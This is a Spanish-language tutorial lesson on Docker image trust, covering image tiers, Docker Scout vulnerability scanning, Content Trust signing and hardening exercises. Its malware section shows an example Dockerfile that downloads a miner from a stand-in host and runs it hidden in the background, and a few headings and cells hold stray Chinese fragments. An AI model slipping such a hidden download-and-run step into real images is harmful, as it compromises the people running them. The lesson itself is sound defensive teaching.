# T04 — Imágenes de confianza

## El riesgo de las imágenes

Una imagen Docker es **código ejecutable empaquetado**. Cuando ejecutas
`docker run some_image`, estás ejecutando código de un tercero con los permisos del
contenedor (por defecto root). Si la imagen contiene malware, se ejecuta en tu
sistema.

```
docker pull usuario_desconocido/app-util:latest
                        │
                        ▼
           ┌─────────────────────────┐
           │  ¿Qué hay dentro?       │
           │                        │
           │  ✓ La aplicación       │
           │  ? Crypto miner        │
           │  ? Backdoor            │
           │  ? CVEs sin parchear   │
           │  ? Credenciales        │
           │    hardcodeadas        │
           │  ? Paquetes obsoletos   │
           └─────────────────────────┘
```

Cada capa de la imagen puede contener código malicioso o vulnerable. No importa
si la aplicación principal es legítima — las capas base o las dependencias pueden
ser el vector de ataque.

## Tipos de imágenes en Docker Hub

### Imágenes oficiales (`library/`)

Mantenidas por Docker Inc. en colaboración con los autores del software. Se
identifican por no tener prefijo de usuario/organización:

```bash
# Imágenes oficiales — sin prefijo
docker pull nginx          # library/nginx
docker pull postgres       # library/postgres
docker pull alpine         # library/alpine
docker pull python         # library/python
docker pull debian         # library/debian
docker pull redis         # library/redis
```

Características:

| Aspecto | Detalle |
|---------|---------|
| Revisadas | Escaneadas por Docker Inc. en cada push |
| Documentación | Mejores prácticas, configuración recomendada |
| Actualizaciones | Regulares (security patches快速的) |
| Dockerfiles | Públicos y auditables en GitHub |
| Variantes | slim (menos paquetes), alpine (muy pequeña), bookworm (Debian 12) |
| Soporte multi-arch | amd64, arm64, arm/v7 |
| Badges | "Official Image" (checkmark azul) |

### Imágenes verificadas (Verified Publisher)

De empresas que Docker ha verificado como legítimas. Tienen un badge verde en Docker Hub:

```bash
# Imágenes de publishers verificados — con prefijo de organización
docker pull bitnami/postgresql    # VMware/Bitnami
docker pull grafana/grafana       # Grafana Labs
docker pull hashicorp/vault       # HashiCorp
docker pull elastic/elasticsearch # Elastic
docker pull prometheus/prometheus  # Prometheus
docker pull mysql/mysql-server    # Oracle/MySQL
```

Criterios de verificación:

- La empresa es validada por Docker
- La imagen es mantenida por la empresa
- Dockerfiles públicos o reviews de seguridad
- Compromiso con actualizaciones de seguridad

### Imágenes community

Publicadas por cualquier usuario. **Sin garantía de calidad ni seguridad**:

```bash
# Imágenes community — usuario/imagen
docker pull random_user/some_tool
docker pull hacker123/cool_tool
docker pull unknown134/myapp

# ¿Quién es random_user?
# ¿El Dockerfile es público?
# ¿Cuándo se actualizó?
# ¿Hay malware en las capas?
```

### Comparación

| Tipo | Confianza | Actualizaciones | Auditoría | Ejemplo |
|---|---|---|---|---|
| Official (library/) | Alta | Regulares, automatizadas | Docker Inc. + upstream | `nginx`, `postgres`, `alpine` |
| Verified Publisher | Media-Alta | Depende del publisher | Publisher verificado por Docker | `bitnami/redis`, `grafana/grafana` |
| Community (user/image) | Variable | Sin garantía | Ninguna | `user123/tool` |

## Riesgos concretos de imágenes no confiables

### Malware embebido

Una imagen puede contener un crypto miner, un reverse shell, o un exfiltrador de
datos que se ejecuta silenciosamente junto con la aplicación legítima:

```dockerfile
# Dockerfile malicioso (ejemplo conceptual)
FROM node:20
COPY app/ /app/
# Carga útil oculta en una capa intermedia
RUN curl -s https://malware.example.com/miner -o /usr/local/bin/.svc && \
    chmod +x /usr/local/bin/.svc
CMD ["/bin/sh", "-c", "/usr/local/bin/.svc & node /app/index.js"]
```

El miner corre en background mientras la aplicación funciona normalmente. Sin
monitoreo, no se detecta.

**Señales de alarma**:

- El comando `docker history` muestra capas con URLs externas sospechosas
- El tamaño de la imagen es mucho mayor de lo esperado
- La imagen hace conexiones salientes a IPs desconocidas
- Procesos inesperados en segundo plano (`ps aux` dentro del contenedor)

### Dependencias con vulnerabilidades (CVEs)

Imágenes con librerías desactualizadas contienen vulnerabilidades conocidas:

```bash
# Una imagen basada en una versión antigua puede tener cientos de CVEs
docker scout cves node:16
# CVE-2023-XXXX (CRITICAL): OpenSSL buffer overflow
# CVE-2023-YYYY (HIGH): libcurl HSTS bypass
# ... 150+ vulnerabilidades

# Versión actualizada tiene menos vulnerabilidades
docker scout cves node:20
# Critical    0
# High        1
# Medium      3
# Low         8
```

### Bases abandonadas

Imágenes que ya no se mantienen y no reciben parches:

```bash
# ¿Cuándo se actualizó esta imagen por última vez?
docker inspect --format '{{.Created}}' some_image:latest
# 2021-03-15T... — hace años, todas las dependencias están desactualizadas

# señales de una imagen abandonada:
# - Último push hace más de 1 año
# - No hay variantes recientes (slim, alpine, etc.)
# - No hay updates de security
# - El repositorio GitHub está archived
```

### Credenciales hardcodeadas

Algunas imágenes contienen credenciales o secrets embebidos:

```bash
# Una imagen maliciosa podría:
# - Tener claves SSH hardcodeadas
# - Credenciales de base de datos
# - Tokens de API
# - Keys de encryption

# Peligro: si la imagen es pública, cualquiera puede ver estos secrets
docker run --rm malicious-image env | grep -i password
```

## Docker Scout — Escaneo de vulnerabilidades

Docker Scout (anteriormente `docker scan`) analiza las capas de una imagen y
compara las dependencias contra bases de datos de CVEs (NVD - National Vulnerability Database):

```bash
# Escaneo rápido — resumen
docker scout quickview nginx:latest
# Target: nginx:latest
# digest: sha256:abc123...
#
#   Critical    0
#   High        2
#   Medium      5
#   Low         12
#   Unspecified 3
#
# Packages    87
# Base image  debian:bookworm-slim (no known vulnerabilities)

# Listar CVEs detalladamente
docker scout cves nginx:latest
# CVE-2024-XXXX  HIGH   libcurl 7.88.1 → fix in 7.88.2
# CVE-2024-YYYY  MEDIUM openssl 3.0.9  → fix in 3.0.10
# ...

# Comparar dos versiones
docker scout compare nginx:1.24 --to nginx:1.25
# Muestra CVEs resueltas y nuevas entre versiones

# Ver solo CVEs de la imagen base
docker scout cves nginx:latest --only-base

# Ver solo CVEs de los packages instalados por el usuario
docker scout cves nginx:latest --only-user
```

### Interpretar los resultados

No todas las CVEs requieren acción inmediata:

| Severidad | Significado | Acción |
|-----------|-------------|--------|
| **CRITICAL** | Remotamente exploitable, sin auth, impacto alto | Parchear inmediatamente |
| **HIGH** | Exploitable pero requiere condiciones específicas | Parchear pronto |
| **MEDIUM** | Puede no aplicar a tu caso de uso | Evaluar contexto |
| **LOW** | Riesgo bajo, difícil de exploit | Monitorear |
| **UNSPECIFIED** | Sin información de severidad | Investigar manualmente |

**Falsos positivos**: una CVE en OpenSSL puede no afectarte si tu aplicación no
usa las funciones vulnerables. Evalúa si la CVE es **explotable en tu contexto**
antes de actuar.

**Priorización**:

```bash
# Solo fallar en CI si hay CRITICAL o HIGH
docker scout cves myapp:v1 --exit-code --only-severity critical,high

# Ver solo CVEs con fix disponible
docker scout cves myapp:v1 --has-fix
```

### Integración con CI/CD

```yaml
# GitHub Actions ejemplo
- name: Scan image for vulnerabilities
  uses: docker/scout-action@v1
  with:
    image: myregistry/myapp:${{ github.sha }}
    only-severity: critical,high
    fail: true
```

## Docker Content Trust (DCT)

DCT verifica que las imágenes estén **firmadas** por su publicador. Cuando está
activo, Docker rechaza imágenes sin firma válida:

```bash
# Activar Content Trust
export DOCKER_CONTENT_TRUST=1

# Pull de una imagen firmada — funciona
docker pull nginx:latest
# Pull (1 of 1): nginx:latest@sha256:...
# Tagging nginx:latest@sha256:... as nginx:latest

# Pull de una imagen sin firmar — falla
docker pull random_user/unsigned_image:latest
# Error: remote trust data does not exist
# No valid trust data for latest
```

### Cómo funciona DCT

```
Publisher pushes image
        │
        ▼
   [Notary Server]
   Firma con clave privada
        │
        ▼
   Imagen + firma almacenada
        │
        │
Consumer pulls image
        │
        ▼
   [Notary Server]
   Verifica firma con clave pública
        │
        ▼
   Imagen válida → se ejecuta
   Imagen no firmada → se rechaza
```

### Firmar imágenes

```bash
# Login a Docker Hub con content trust
export DOCKER_CONTENT_TRUST=1
docker login

# Push de una imagen — se firma automáticamente si DCT está activo
docker push myuser/myapp:v1
# Signing and pushing trust data
# Enter passphrase for root key: ********
# Enter passphrase for repository key: ********

# Ver las claves de un repositorio
docker trust inspect myuser/myapp
# Signers:
#   - myuser  (key: abc123...)

# Agregar un signer a una imagen
docker trust signer add --key /path/to/developer.key myuser myapp
```

### Limitaciones de DCT

- Requiere que el publisher firme sus imágenes
- Muchas imágenes community no están firmadas
- Si pierdes la clave raíz, no puedes actualizar la imagen
- DCT no verifica el contenido, solo la procedencia

## Buenas prácticas

### 1. Usar imágenes oficiales como base

```dockerfile
# Bien: imagen oficial, versión específica
FROM python:3.12-slim-bookworm

# Evitar: imagen community de origen desconocido
# FROM random_user/python-custom:latest
```

### 2. Especificar versiones exactas (nunca `latest`)

```bash
# Mal: latest puede cambiar en cualquier momento
docker pull nginx:latest

# Bien: versión específica
docker pull nginx:1.25.4

# Mejor: digest (inmutable, reproducibilidad garantizada)
docker pull nginx@sha256:abc123def456...
```

La etiqueta `latest` no significa "la más reciente" — es simplemente la etiqueta
por defecto. El mantenedor puede apuntar `latest` a cualquier versión, y puede
cambiar sin aviso.

### 3. Escanear regularmente

```bash
# Integrar en CI/CD
docker scout cves myimage:v1.2.3 --exit-code --only-severity critical,high
# Exit code != 0 si hay CVEs critical o high → rompe el pipeline

# Escaneo en本地 antes de push
docker scout cves myimage:v1.2.3 --exit-code
```

### 4. Reconstruir periódicamente

Las dependencias de la imagen base se parchean continuamente. Reconstruir la
imagen incorpora los parches más recientes:

```bash
# Reconstruir sin caché para obtener las dependencias más recientes
docker build --no-cache -t myapp:v1.2.3 .

# Programar rebuilds automáticos cuando hay updates de seguridad
# - Usar Renovate/Dependabot para detectar updates
# - Rebuild automatic cuando la imagen base se actualiza
```

### 5. Minimizar la superficie de ataque

```dockerfile
# Usar imágenes mínimas
FROM python:3.12-slim-bookworm  # En lugar de python:3.12 (full)

# Multi-stage build — copiar solo lo necesario
FROM python:3.12 AS builder
COPY requirements.txt .
RUN pip install --target=/install -r requirements.txt

FROM python:3.12-slim-bookworm
COPY --from=builder /install /usr/local/lib/python3.12/site-packages
COPY app/ /app/
USER appuser
CMD ["python", "/app/main.py"]
```

Menos paquetes = menos CVEs potenciales = menor superficie de ataque.

### 6. Verificar el Dockerfile

Antes de usar una imagen community, verifica que el Dockerfile esté disponible:

```
Docker Hub → imagen → "Dockerfile" tab
GitHub → repositorio del mantenedor → Dockerfile

Si no hay Dockerfile público → no confíes en la imagen
```

**Preguntas a responder**:

- ¿El Dockerfile es público?
- ¿Las capas tienen comandos sospechosos (curl a URLs externas, wget sin verificación)?
- ¿El tamaño de la imagen es razonable?
- ¿Hay un mantenedor activo?

### 7. Usar digest para reproducibilidad

```bash
# Obtener digest de una imagen
docker inspect --format '{{index .RepoDigests 0}}' nginx:latest
# nginx@sha256:abc123...

# Usar digest en Dockerfile
# FROM nginx@sha256:abc123...
# Esto garantiza que siempre usas exactamente la misma imagen
```

### 8.定期审核

```bash
# Revisar imágenes en uso regularmente
docker images | grep -v "^REPOSITORY"

# Auditar imágenes con docker history
docker history nginx:latest

# Verificar que no hay secrets en la imagen
docker run --rm nginx:latest env | grep -iE "password|secret|key|token"
```

## Herramientas de seguridad comparadas

| Herramienta | Qué hace | Cuándo usarla |
|---|---|---|
| `docker scout cves` | Escanea CVEs en dependencias | Antes de deploy, en CI/CD |
| `docker scout quickview` | Resumen rápido de seguridad | Evaluación rápida |
| `docker trust inspect` | Verifica firmas de imágenes | Validar origen |
| `DOCKER_CONTENT_TRUST=1` | Rechaza imágenes sin firmar | Entornos restringidos |
| `docker history` | Ver capas y comandos de la imagen | Auditar qué se instaló |
| `docker inspect` | Metadata completa de la imagen | Verificar USER, EXPOSE, etc. |
| `docker scout compare` | Compara CVEs entre versiones | Planificar updates |
| `docker scout recommendations` | Sugiere fixes para CVEs | Priorizar parches |

## Tabla resumen de confianza por tipo de imagen

| Criterio | Official | Verified Publisher | Community |
|----------|----------|-------------------|-----------|
| Identificación | Sin prefijo | Badge verde | Usuario/prefijo |
| Mantenedor | Docker + upstream | Empresa verificada | Cualquiera |
| Dockerfile público | Sí | Generalmente | Puede no estar |
| Escaneo automático | Sí | Sí | No |
| Actualizaciones security | Rápidas | Depende | No garantizado |
| Multi-arquitectura | Sí | Generalmente | No |
| Reviews de seguridad | Docker Inc. | Vendor | Ninguna |

## Práctica

### Ejercicio 1 — Escanear vulnerabilidades

```bash
# Escanear una imagen reciente
docker scout quickview alpine:latest

# Escanear una imagen más antigua y comparar
docker scout quickview node:16
# Comparar la cantidad de CVEs

# Ver detalles de las CVEs critical/high
docker scout cves node:16 --only-severity critical,high 2>&1 | head -30

# Ver CVEs con fix disponible
docker scout cves nginx:latest --has-fix
```

### Ejercicio 2 — Comparar imágenes full vs slim

```bash
# Descargar variantes de la misma imagen
docker pull python:3.12
docker pull python:3.12-slim

# Comparar tamaño
docker images | grep "^python"

# Comparar vulnerabilidades
docker scout quickview python:3.12
docker scout quickview python:3.12-slim
# La versión slim tiene significativamente menos CVEs

# Ver qué paquetes extras tiene la versión full
docker run --rm python:3.12 pip list | wc -l
docker run --rm python:3.12-slim pip list | wc -l
```

### Ejercicio 3 — Auditar una imagen con `docker history`

```bash
# Ver los comandos que construyeron la imagen
docker history nginx:latest --no-trunc --format "{{.CreatedBy}}" | head -15

# Buscar URLs externas o comandos sospechosos
docker history nginx:latest --no-trunc | grep -E "curl|wget|http"

# Ver el tamaño de cada capa
docker history nginx:latest --format "table {{.CreatedBy}}\t{{.Size}}"

# Verificar si la imagen define un USER non-root
docker inspect --format '{{.Config.User}}' nginx:latest
# "" (vacío) → corre como root por defecto (pero nginx hace drop de privilegios internamente)

docker inspect --format '{{.Config.User}}' postgres:16
# "" → root al inicio, pero el entrypoint cambia a postgres
```

### Ejercicio 4 — Docker Content Trust

```bash
# Activar Content Trust
export DOCKER_CONTENT_TRUST=1

# Pull de imagen oficial firmada
docker pull alpine:latest
# Funciona — imagen firmada

# Desactivar para continuar con el laboratorio
unset DOCKER_CONTENT_TRUST

# Ver información de confianza de una imagen
docker trust inspect alpine
# Muestra las claves que firman la imagen
```

### Ejercicio 5 — Comparar digest vs tag

```bash
# Obtener digest de una imagen
docker pull nginx:latest
DIGEST=$(docker inspect --format '{{index .RepoDigests 0}}' nginx:latest | cut -d@ -f2)
echo "Digest: $DIGEST"

# Usar digest para garantizar inmutabilidad
docker pull nginx@$DIGEST

# Crear una imagen y ver su digest
docker build -t myapp:v1 .
docker inspect --format '{{index .RepoDigests 0}}' myapp:v1
```

### Ejercicio 6 — Evaluar una imagen community

```bash
# NO ejecutar esta imagen sin verificar antes
# Esto es solo para demostración del proceso de evaluación

# 1. Verificar si tiene Dockerfile público
docker pull bitnami/postgresql
# Bitnami es Verified Publisher - confiable

# 2. Ver el tamaño (imágenes sospechosamente grandes pueden tener malware)
docker images | grep postgresql

# 3. Ver las capas
docker history bitnami/postgresql | head -10

# 4. Escanear con scout
docker scout quickview bitnami/postgresql

# 5. Verificar que el usuario existe y tiene repositorios confiables
# En Docker Hub: buscar el usuario
# Verificar: ¿tiene badge de Verified Publisher?
```

### Ejercicio 7 — Integración en CI/CD

```bash
# Simular un pipeline de CI
# 1. Build de la imagen
docker build -t myapp:v1.2.3 .

# 2. Escaneo de vulnerabilidades
docker scout cves myapp:v1.2.3 --exit-code --only-severity critical,high
# Si hay CVEs critical/high, el exit code es != 0

# 3. Push solo si pasa el scan
# docker push myapp:v1.2.3

# Script completo
#!/bin/bash
set -e

TAG=$1
docker build -t myapp:$TAG .
docker scout cves myapp:$TAG --exit-code --only-severity critical,high
docker push myapp:$TAG
```

### Ejercicio 8 — Reconstrucción periódica

```bash
# Simular un rebuild semanal
# 1. Obtener información de la imagen base
docker inspect --format '{{.Config.Image}}' myapp:v1

# 2. Ver cuándo se actualizó la imagen base
docker inspect --format '{{.Created}}' myapp:v1

# 3. Comparar con la versión más reciente de la imagen base
docker pull python:3.12-slim
docker scout compare myapp:v1 --to python:3.12-slim

# 4. Rebuild si hay updates
docker build --no-cache -t myapp:v2 .
```
